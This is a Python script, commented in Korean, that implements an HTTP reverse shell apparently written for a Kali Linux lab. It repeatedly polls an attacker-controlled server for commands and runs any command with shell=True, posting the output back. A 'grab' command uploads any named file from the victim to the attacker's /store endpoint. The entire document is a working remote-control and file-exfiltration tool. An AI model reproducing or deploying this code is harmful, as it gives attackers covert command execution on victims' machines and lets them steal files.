import requests
import subprocess
import os
import time

while True:
    req = requests.get('http://192.168.32.10') ## Kali 리눅스에 GET 요청
    command = req.text ## 공격자의 명령어를 받는다

    if 'terminate' in command: ## 명령어가 terminate 이면 종료
        break
    elif 'grab' in command: ## 명령어가 grab 이면?
        grab,path=command.split('*') ## 전달받은 명령어를 * 를 기준으로 앞부분은 grab에 뒷부분은 path에 저장한다.
        if os.path.exists(path): ## path 변수에 있는 파일명이 존재하면?
            url = 'http://192.168.32.10/store' ## kali 리눅스 /store 경로를 url에 저장
            files = {'file':open(path,'rb')} ## 입력 받은 파일내용을 읽어서 files 에 저장
            r = requests.post(url,files=files) ## url에 files 내용을 전달한다.
        else: ## path 변수에 있는 파일이 존재하지 않으면? Not able to get the path 를 리턴
            post_response = requests.post(url='http://192.168.32.10',data='[-] Not able to get the path')
    else: ## grab, terminate 이외의 명령어가 입력되었을 때 일반 명령어 처리 (에러 핸들링)
        CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.32.10',data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.32.10',data=CMD.stderr.read())

    time.sleep(3) # 3초의 대기시간을 갖는다. packet 손실이나 drop 을 대비하여
